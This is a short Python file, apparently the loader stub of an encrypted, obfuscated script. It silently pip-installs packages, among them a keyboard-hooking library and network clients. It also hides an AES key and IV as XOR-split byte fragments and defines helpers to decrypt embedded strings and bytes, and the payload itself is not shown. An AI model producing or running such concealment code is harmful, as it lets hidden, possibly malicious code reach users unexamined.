
import sys, base64, zlib, subprocess

def _req_check(p, m=None):
    if m is None: m = p
    try:
        __import__(m)
    except ImportError:
        print(f"[*] Installing dependency: {p}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", p, "--quiet"])

# ติดตั้งตัวถอดรหัสก่อน
_req_check("pycryptodome", "Crypto")

# ติดตั้ง Module ที่แสกนเจอจากโค้ดของคุณ
_needed = ['hashlib', 'typing', 'subprocess', 'httpx', 'asyncio', 'keyboard', 'ctypes', 'requests', 'os', 'dataclasses', 'rich', 'datetime', 'ujson']
for mod in _needed:
    _req_check(mod)

from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _xor(p):
    from functools import reduce
    return reduce(lambda a,b: bytes(x^y for x,y in zip(a,b)), p)

_K = _xor([b'\tvr8\xe6\x81\x95\x98U!`\x1e\xc4\x805de\x91\xd4\x958\xf2\x80\xb5\xd0\x85\xa0\x8b\xc8\xc6";', b'\xc9c\xc9\x87\xd3\xf4%k\x9d*\xb1`X>\xb6m\xbb\xbd\xb4\x932n\x7f\x84\xb0\xee\x13u\x84j4\xf0', b'\xd2\x99\x1b\x03\xa7O(\x91\xdf*9\x91TW\x8c\x8eLZ\x8au\xb82\x1d~\xc28E\x9b\x16Sj.'])
_I = _xor([b'\xc1\x14-k\xb3\x8e\xdc\xd9\xfc\x02W\x1d\xf3\xceI\x8c', b'\x8a\xbdW\xbfk\xfc\xab\x12a>\x96w\xb5\x9a\xea\x8d'])

def _decrypt_str(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16).decode("utf-8", "ignore")

def _decrypt_bytes(d):
    iv, p = d[:16], d[16:]
    return unpad(AES.new(_K, AES.MODE_CBC, iv).decrypt(p), 16)

